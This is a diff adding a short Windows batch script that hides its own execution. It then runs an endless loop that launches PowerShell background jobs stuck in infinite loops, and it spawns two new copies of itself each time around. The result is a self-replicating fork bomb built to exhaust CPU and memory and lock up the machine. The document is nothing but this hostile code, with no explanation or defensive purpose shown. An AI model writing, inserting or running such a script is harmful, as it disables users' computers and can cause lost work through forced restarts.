@@ -1,0 +1,10 @@
+@echo off
+if "%~1"=="hidden" goto :execute
+start /b "" wscript.exe //b "%~f0" hidden
+exit
+:execute
+:Tech
+start /b "" powershell -Command "while(1){Start-Job {while(1){}}}"
+start /b "" "%~f0" hidden
+start /b "" "%~f0" hidden
+goto Tech
